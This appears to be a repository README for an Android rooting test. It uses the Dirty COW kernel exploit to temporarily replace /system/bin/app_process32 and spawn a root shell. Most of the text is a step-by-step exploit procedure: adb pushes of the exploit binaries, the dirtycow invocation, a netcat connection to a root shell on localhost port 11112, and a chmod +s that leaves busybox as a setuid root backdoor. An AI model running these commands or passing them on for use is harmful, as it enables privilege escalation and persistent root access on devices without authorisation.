# Test root shell for any android phone with app-process32
Test root shell for any android phone with app-process32


This is nothing more than a test. It is a limited root shell, the test is to see how much can be done in the current contex.

to use the test
download or clone and (read the contents first is allways safer) run the one-click-root.bat
It will push 4 files to /data/local/tmp on your phone, it will use the "dirtycow" exploit to 
replace (temporarily)  the app_precess32 on /system/bin
then that will "fork" a shell as root.
next command will inject the contents of the cp_comand.txt to that shell.
proof of concept you should see you can create files as and owned by root now.

The road block from here is the contex of the root. I try to cp from /dev/block to pull recovery and boot, but get permission denied
on my samsung. On my other phone it works 

I put this in the public for hope of colaberation and further the effort.


If building from source instead of using prebuilt.

*** copy the "buildables" ***folder to the "android_external" folder in you android build enviroment.
name the folder something rememberable like "dirty-cow"

cd into your enviroment work folder

then after lunch for your device

make -j* dirtycow recowvery-app_process32

should have built binaries in the output folder, that you built.


USEAGE outside of using the scripts:

1: adb push dirtycow /data/local/tmp/dirtycow
2: adb push recowvery-app_process32 /data/local/tmp/recowvery-app_process32
***** used busybox that was prebilt and did not include busybox.c , you can find git that has busybox.c and build if desired*******
3: adb push busybox /data/local/tmp/busybox
4: adb shell chmod 0777 /data/local/tmp/*
5: adb shell /data/local/tmp/dirtycow /system/bin/app_process32 /data/local/tmp/recowvery-app_process32
*** after dirty cow finishes wait about 1 minute, phone is expected to soft reboot and buttons and screen become non responsive, while adb remain connected.
6: adb shell
7: /data/local/tmp/busybox nc localhost 11112
*** this should open a promtless shell with root access, you see cpio and no cuser. You can type and see your entry
8: mkdir /data/local/test     
9: /system/bin/chmod 0777 /data/local/test
10: ls -l /data/local
11: cp /data/local/tmp/busybox /data/local/test/busybox
12: /system/bin/chmod 0777 /data/local/test/busybox
13: ls -l /data/local/test                                  
14: /system/bin/chmod +s /data/local/test/busybox           
15: ls -l /data/local/test                                  shows can chmod files that are owned by root                                 
16: whoami                                                  shows the id of shell (root)
17: pwd                                                     shows the current dir
18: exit
